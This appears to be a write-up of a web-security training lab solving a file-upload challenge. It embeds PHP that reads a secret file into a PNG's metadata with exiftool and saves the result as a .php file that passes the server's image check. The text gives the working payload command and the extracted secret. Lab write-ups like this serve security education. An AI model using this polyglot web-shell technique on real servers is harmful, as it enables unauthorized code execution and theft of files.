# Lab: Remote code execution via polyglot web shell upload

>This lab contains a vulnerable image upload function. Although it checks the contents of the file to verify that it is a genuine image, it is still possible to upload and execute server-side code.

>To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.

>You can log in to your own account using the following credentials: wiener:peter

### Observations
I attempted to upload my php file titled `1readfile.png` but got the following error: `Error: file is not a valid image`

We are told that the upload functionality checks the contents of the file, so my first idea was to add a JPG signature `FF D8 FF` at the beginning of the file with a hex editor. After lots of tinkering, I was having no success

### Next steps
From participating in a ton of CTFs, I know of a tool called `exiftool` that can be used to read and write metadata to files. We know that the upload functionality checks metadata to determine the type of file being uploaded, so what if we can modify the metadata to look like a typical image file (png, for example)

One way to do this would be to embed php code into a legit image file. So I went to google and downloaded a random png file and ran:

`exiftool -Comment="<?php echo file_get_contents('/home/carlos/secret');?>" smile.png -o result.php`

We are taking my downloaded image `smile.png` and inserting a comment (php code) into the metadata, then outputting the resulting file as `result.php`

Checking the filetype of result.php, we get `result.php: PNG image data, 1200 x 1200, 8-bit/color RGBA, non-interlaced`. Awesome! This file is being identified as a .png because of the metadata!

### Solution
Navigating to `/files/avatars/result.php` shows us a whole bunch of information. Most of it is the data that creates up our `smile.png` file, but we can also see some of the metadata, AND the output of our php command

This area is of particular interest `�9>tEXtCommentMvBoB2bAsQFL4wTJnqJ5vSlcFJuDFnRE�`

From here I found that the secret for user carlos was `MvBoB2bAsQFL4wTJnqJ5vSlcFJuDFnRE`

Lab solved!


